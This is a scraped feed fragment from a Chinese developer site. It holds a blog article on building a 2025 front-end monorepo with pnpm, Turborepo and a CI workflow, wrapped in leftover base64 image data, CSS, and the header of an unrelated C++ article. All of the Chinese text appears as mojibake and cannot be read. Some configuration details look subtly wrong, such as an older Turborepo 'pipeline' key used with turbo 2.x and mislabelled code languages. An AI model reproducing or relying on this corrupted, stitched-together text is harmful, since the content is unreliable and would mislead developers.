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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ§© ä¸€ã€ä¸ºä»€ä¹ˆ 2025 å¹´è¿˜åœ¨è°ˆ Monorepoï¼Ÿ</h2>
<blockquote>
<p>â€œå› ä¸ºæˆ‘ä»¬ä¸åªæ˜¯å†™é¡µé¢ï¼Œæˆ‘ä»¬åœ¨åè°ƒå®‡å®™ã€‚â€</p>
</blockquote>
<h3 data-id="heading-1">ğŸŒˆ èƒŒæ™¯æ¼”è¿›ï¼š</h3>
<ul>
<li><strong>2018 ä»¥å‰</strong>ï¼šå‰ç«¯é¡¹ç›®åˆ†æ•£ï¼Œæ¯ä¸ª repo éƒ½æ˜¯ä¸€ä¸ªå­¤å²› ğŸï¸ã€‚</li>
<li><strong>2019â€“2022</strong>ï¼šç»„ä»¶åº“å¤ç”¨å¼€å§‹æµè¡Œï¼Œäººä»¬å¼•å…¥ Lerna / Yarn Workspacesã€‚</li>
<li><strong>2023â€“2024</strong>ï¼šå¾®å‰ç«¯ + PNPM Workspaces æˆä¸ºä¸»æµï¼ŒTurboRepoã€Nx æ”»åŸç•¥åœ°ã€‚</li>
<li><strong>2025</strong>ï¼šAI è‡ªåŠ¨åŒ–ã€CI/CD æ™ºèƒ½åŒ–ã€è·¨ç«¯æ„å»ºç»Ÿä¸€åŒ–çš„æ—¶ä»£ã€‚<br/>
ğŸ‘‰ ä¸€ä¸ª repo ç®¡ç†å¤šä¸ªå¹³å°ï¼Œå·²ç»ä¸åªæ˜¯è¶‹åŠ¿ï¼Œè€Œæ˜¯åˆšéœ€ã€‚</li>
</ul>
<p>ä¸¾ä¾‹ï¼Œä¸€ä¸ªç°ä»£å…¬å¸å¯èƒ½æœ‰ä»¥ä¸‹å‰ç«¯èµ„äº§ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/apps
  â”œâ”€â”€ web-admin-dashboard
  â”œâ”€â”€ mobile-react-native-app
  â”œâ”€â”€ desktop-electron-shell
/packages
  â”œâ”€â”€ ui-components
  â”œâ”€â”€ utils
  â”œâ”€â”€ config
  â”œâ”€â”€ shared-apis
/tools
  â”œâ”€â”€ scripts
  â””â”€â”€ ai-automation
</code></pre>
<p>è¿™äº›é¡¹ç›®è€¦åˆè€Œä¸ä¹±ï¼Œå„è‡ªç‹¬ç«‹åˆå…±äº«åº•å±‚é€»è¾‘ã€‚<br/>
ä¸€ä¸ªæäº¤ï¼Œå½±å“å¤šä¸ªç”Ÿæ€ã€‚è®©å·¥ç¨‹ååŒåƒè°ƒäº¤å“ä¹ä¸€æ ·ä¼˜é›… ğŸ»ã€‚</p>
<hr/>
<h2 data-id="heading-2">ğŸ—ï¸ äºŒã€æ ¸å¿ƒç†å¿µï¼šä¾èµ–ç»Ÿä¸€ Â· æ„å»ºåˆ†å±‚ Â· æ¨¡å—è‡ªæ²»</h2>
<p>è¦è®¾è®¡ä¸€ä¸ªé¢å‘æœªæ¥çš„ Monorepoï¼Œæˆ‘ä»¬å¾—æ˜ç¡®ä¸‰å¤§åŸåˆ™ï¼š</p>
<h3 data-id="heading-3">1. <strong>ä¾èµ–ç»Ÿä¸€ï¼ˆUnified Dependency Graphï¼‰</strong></h3>
<p>ä½¿ç”¨ <code>pnpm</code> æˆ– <code>yarn berry</code> å®ç° workspace çš„æ‰å¹³ä¾èµ–ç®¡ç†ã€‚<br/>
æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š</p>
<blockquote>
<p>æ‰€æœ‰æ¨¡å—å…±äº«ä¾èµ–å£°æ˜ï¼Œä½†åªåœ¨æœ¬åœ°å»ºç«‹â€œå¼•ç”¨ç¬¦å·é“¾æ¥â€ï¼Œé¿å…é‡å¤å®‰è£…ã€‚</p>
</blockquote>
<p><strong>æ¨èé…ç½®ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">init</span>
pnpm install -w
pnpm <span class="hljs-keyword">add</span> typescript eslint prettier -w
</code></pre>
<p><code>package.json</code> çš„ç»“æ„ ğŸ‘‡ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"@company/monorepo"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"apps/*"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"packages/*"</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.8.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"turbo"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.4"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^9.0.1"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">2. <strong>æ„å»ºåˆ†å±‚ï¼ˆLayered Build Systemï¼‰</strong></h3>
<p>åœ¨ 2025 å¹´ï¼Œä½ å¯ä»¥è®© <strong>å•ä¸ªå‘½ä»¤è‡ªåŠ¨è°ƒåº¦ä¾èµ–æ„å»ºé“¾</strong> ğŸ’¥ã€‚</p>
<p>ä¾‹å¦‚ä½¿ç”¨ <strong>Turborepo</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># turbo.json</span>
{
  <span class="hljs-string">"<span class="hljs-variable">$schema</span>"</span>: <span class="hljs-string">"https://turborepo.org/schema.json"</span>,
  <span class="hljs-string">"pipeline"</span>: {
    <span class="hljs-string">"build"</span>: {
      <span class="hljs-string">"dependsOn"</span>: [<span class="hljs-string">"^build"</span>],
      <span class="hljs-string">"outputs"</span>: [<span class="hljs-string">"dist/**"</span>]
    },
    <span class="hljs-string">"lint"</span>: {},
    <span class="hljs-string">"dev"</span>: {
      <span class="hljs-string">"cache"</span>: <span class="hljs-literal">false</span>
    }
  }
}
</code></pre>
<p>åœ¨ä»»æ„å­é¡¹ç›®æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">pnpm turbo run build
</code></pre>
<p>Turbo ä¼šè‡ªåŠ¨ï¼š</p>
<ul>
<li>è·³è¿‡æœªå˜æ›´æ¨¡å—ï¼›</li>
<li>å¹¶è¡Œæ‰§è¡Œç‹¬ç«‹ä»»åŠ¡ï¼›</li>
<li>ç¼“å­˜äº§ç‰©åˆ°è¿œç«¯ï¼ˆç”šè‡³å¯ä»¥è¿›å…¥ AI ç¼–è¯‘ç¼“å­˜é˜¶æ®µï¼Œè°ƒç”¨äº‘ API æé€Ÿï¼‰ã€‚</li>
</ul>
<p>AI å®é™…ç”¨è¿™ç§æ¨¡å¼å¯åœ¨ 30 ç§’å†…æ„å»ºä¸€ä¸ªç™¾æ¨¡å—å‰ç«¯ä»“åº“ ğŸš€ã€‚</p>
<hr/>
<h3 data-id="heading-5">3. <strong>æ¨¡å—è‡ªæ²»ï¼ˆAutonomous Module Designï¼‰</strong></h3>
<p>æ¯ä¸ªå­åŒ…ï¼ˆpackageï¼‰åº”è¯¥è‡ªåŒ…å«ï¼š</p>
<ul>
<li>è‡ªå·±çš„ä¾èµ–ï¼›</li>
<li><code>tsconfig.json</code>;</li>
<li>æµ‹è¯•ä¸æ„å»ºè„šæœ¬ï¼›</li>
<li>ä¸ä¸»ä»“åº“ ESLintã€Prettier ä¸€è‡´çš„çº¦æŸã€‚</li>
</ul>
<p>ä¾‹å¦‚ <code>/packages/ui-components/package.json</code>ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"@company/ui-components"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.0.0"</span>,
  <span class="hljs-string">"main"</span>: <span class="hljs-string">"dist/index.js"</span>,
  <span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"build"</span>: <span class="hljs-string">"tsup src/index.ts --dts"</span>,
    <span class="hljs-string">"test"</span>: <span class="hljs-string">"vitest"</span>
  }
}
</code></pre>
<p>å®ƒæ—¢èƒ½ä½œä¸ºç‹¬ç«‹ npm åŒ…å‘å¸ƒï¼Œä¹Ÿèƒ½è¢«å†…éƒ¨ app å®æ—¶å¼•ç”¨ã€‚<br/>
è¿™å°±æ˜¯æ‰€è°“ <strong>æ¨¡å—è‡ªæ²» + å†…éƒ¨å…±äº«ç”Ÿæ€</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-6">ğŸ§  ä¸‰ã€çµé­‚æ­¦å™¨ï¼šå·¥å…·ç»„åˆæ‹³</h2>













































<table><thead><tr><th>å·¥å…·</th><th>èŒè´£</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong>PNPM Workspaces</strong></td><td>å¿«é€Ÿç®¡ç†å¤šé¡¹ç›®ä¾èµ–</td><td>æ›¿ä»£ Yarn Workspaces</td></tr><tr><td><strong>TurboRepo / Nx</strong></td><td>æ„å»ºå’Œç¼“å­˜è°ƒåº¦</td><td>Turbo æ›´è½»é‡ï¼ŒNx æ›´ä¼ä¸šçº§</td></tr><tr><td><strong>ESBuild / Vite</strong></td><td>å¼€å‘ä¸æ„å»º</td><td>ç»Ÿä¸€æ„å»ºæ¥å£</td></tr><tr><td><strong>TypeScript Project References</strong></td><td>è·¨åŒ… TS ç±»å‹å…±äº«</td><td>VSCode æ™ºèƒ½æ¨å¯¼</td></tr><tr><td><strong>Vitest / Playwright</strong></td><td>å•å…ƒä¸ç«¯åˆ°ç«¯æµ‹è¯•</td><td>ä¸€ä½“åŒ–æµ‹è¯•æ–¹æ¡ˆ</td></tr><tr><td><strong>Changesets</strong></td><td>è‡ªåŠ¨ç‰ˆæœ¬ä¸å‘å¸ƒæ—¥å¿—ç®¡ç†</td><td>ğŸ’¡ Monorepo å®è—</td></tr><tr><td><strong>AI Assistant (è‡ªç ”)</strong></td><td>è‡ªåŠ¨ç”Ÿæˆ CI é…ç½®ã€Doc ä¸ä»£ç æ£€æŸ¥</td><td>2025 æ–°è¶‹åŠ¿ï¼ğŸ¤–</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">âš¡ å››ã€å®é™…é¡¹ç›®ç»“æ„ï¼šå¸¦ç”µçš„æ¶æ„æ ‘</h2>
<pre><code class="hljs language-csharp" lang="csharp">company-monorepo/
â”‚
â”œâ”€â”€ apps/
â”‚   â”œâ”€â”€ web-dashboard/
â”‚   â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â”œâ”€â”€ vite.config.ts
â”‚   â”‚   â””â”€â”€ package.json
â”‚   â”œâ”€â”€ mobile-rn/
â”‚   â””â”€â”€ electron-shell/
â”‚
â”œâ”€â”€ packages/
â”‚   â”œâ”€â”€ ui-kit/
â”‚   â”œâ”€â”€ hooks/
â”‚   â”œâ”€â”€ api/
â”‚   â”œâ”€â”€ config/
â”‚   â””â”€â”€ shared-types/
â”‚
â”œâ”€â”€ .husky/              <span class="hljs-meta"># æäº¤é’©å­</span>
â”œâ”€â”€ turbo.json           <span class="hljs-meta"># æ„å»ºç®¡æ§</span>
â”œâ”€â”€ pnpm-workspace.yaml
â””â”€â”€ tsconfig.<span class="hljs-keyword">base</span>.json
</code></pre>
<hr/>
<h2 data-id="heading-8">ğŸ§¬ äº”ã€ä»é›¶æ­å»ºå‘½ä»¤æ‘˜è¦</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆå§‹åŒ– monorepo æ¡†æ¶</span>
pnpm init
pnpm install -D turbo typescript eslint prettier

<span class="hljs-comment"># åˆå§‹åŒ–æ„å»ºç¼“å­˜ä¸è„šæœ¬</span>
npx turbo init

<span class="hljs-comment"># æ–°å»º package ä¸ app</span>
pnpm create vite apps/web-dashboard --template react-ts
pnpm create package packages/ui-kit

<span class="hljs-comment"># å…³è”å¼€å‘</span>
pnpm add @company/ui-kit -F @company/web-dashboard
</code></pre>
<p>ğŸ’¡ <strong>Tipï¼š</strong><br/>
ä½¿ç”¨ <code>-F</code> æŒ‡å®š workspaceï¼Œèƒ½ä¿è¯å…³è”æ—¶ç‰ˆæœ¬ç²¾å‡†ï¼Œä¸ä¼šâ€œæ‹‰æœ€æ–°â€ã€‚</p>
<hr/>
<h2 data-id="heading-9">ğŸ§‘â€ğŸ’» å…­ã€2025 å¹´çš„å‰ç«¯ CI/CD é©å‘½</h2>
<p><strong>AI å·¥ç¨‹è¾…åŠ© + äº‘ç¼“å­˜ = Monorepo é£èµ·</strong></p>
<p>å»ºè®®åœ¨ CI ç®¡çº¿ä¸­åŠ å…¥ AI å®¡æŸ¥é€»è¾‘ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .github/workflows/build.yml</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">pnpm</span> <span class="hljs-string">install</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">pnpm</span> <span class="hljs-string">turbo</span> <span class="hljs-string">run</span> <span class="hljs-string">lint</span> <span class="hljs-string">build</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npx</span> <span class="hljs-string">ai-cli</span> <span class="hljs-string">check</span> <span class="hljs-string">code-quality</span> <span class="hljs-string">--mode</span> <span class="hljs-string">deep</span>
</code></pre>
<p>AI å¯åœ¨æ­¤é˜¶æ®µæ‰§è¡Œï¼š</p>
<ul>
<li>æ™ºèƒ½ä¾èµ–å‰”é™¤ï¼›</li>
<li>æ„å»ºé€Ÿåº¦é¢„æµ‹ï¼›</li>
<li>commit è¯­ä¹‰æ£€æŸ¥ï¼›</li>
<li>è‡ªåŠ¨ä¿®å¤æ½œåœ¨çš„"å¾ªç¯å¼•ç”¨"é—®é¢˜ã€‚</li>
</ul>
<p>è®©ä»£ç åƒ Ferrari ä¸€æ ·æµç•…ä¸Šè·¯ ğŸï¸ã€‚</p>
<hr/>
<h2 data-id="heading-10">ğŸ§˜ ä¸ƒã€å“²å­¦æ€»ç»“ï¼šMonorepo â‰  å·¨å¤§ä»£ç ä»“åº“</h2>
<p>Monorepo ä¸æ˜¯â€œä»£ç éƒ½å †ä¸€èµ·â€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p>â€œä¸€ä¸ªé€»è¾‘ä¸Šçš„æ˜Ÿç³»ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æ˜¯ä¸€é¢—æ’æ˜Ÿã€‚â€</p>
</blockquote>
<p>å®ƒçš„çµé­‚æ˜¯<strong>ç»Ÿä¸€åä½œã€å…±äº«ç”Ÿæ€ã€åˆ†å±‚æ„å»ºã€æ™ºèƒ½ç®¡ç†</strong>ã€‚<br/>
å½“ä½ é…åˆ AI å·¥å…·é“¾ã€äº‘ç¼“å­˜ã€é¡¹ç›®å¼•ç”¨æœºåˆ¶ï¼Œ<br/>
æ•´ä¸ªå‰ç«¯å›¢é˜Ÿçš„æ•ˆç‡ï¼Œå°†æ¯”è‚©é‡å­ä¼ é€èˆ¬é¡ºç•… âš›ï¸ã€‚</p>
<hr/>
<h2 data-id="heading-11">ğŸª„ ç»“è¯­ï¼š2025ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆçš„èœ•å˜</h2>
<p>æœªæ¥çš„å‰ç«¯ä¸æ­¢æ˜¯å†™ UIï¼Œè€Œæ˜¯å»ºé€ æ•´ä¸ªä¿¡æ¯ç”Ÿæ€çš„â€œç³»ç»Ÿå·¥ç¨‹â€ã€‚</p>
<p>Monorepo æ˜¯è¿™åœºèœ•å˜çš„åœŸå£¤ï¼›<br/>
AI æ˜¯æ–°ä¸€ä»£çš„å¼€å‘åŒäº‹ï¼›<br/>
è€Œå·¥ç¨‹å¸ˆï¼Œåˆ™æ˜¯æ¶æ„çš„è¯—äººã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¯æ—¥ä¸€ä¸ªC++çŸ¥è¯†ç‚¹|å¤šçº¿ç¨‹åŸºç¡€]]></title>    <link>https://juejin.cn/post/7581693431740350527</link>    <guid>https://juejin.cn/post/7581693431740350527</guid>    <pubDate>2025-12-09T16:47:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431740350527" data-draft-id="7581678032336961578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¯æ—¥ä¸€ä¸ªC++çŸ¥è¯†ç‚¹|å¤šçº¿ç¨‹åŸºç¡€"/> <meta itemprop="keywords" content="ç¼–ç¨‹è¯­è¨€,C++"/> <meta itemprop="datePublished" content="2025-12-09T16:47:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å›¾å½¢å­¦çˆ±å¥½è€…_Wu"/> <meta itemprop="url" content="https://juejin.cn/user/1060359067408631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¯æ—¥ä¸€ä¸ªC++çŸ¥è¯†ç‚¹|å¤šçº¿ç¨‹åŸºç¡€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1060359067408631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å›¾å½¢å­¦çˆ±å¥½è€…_Wu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T16:47:54.000Z" title="Tue Dec 09 2025 16:47:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
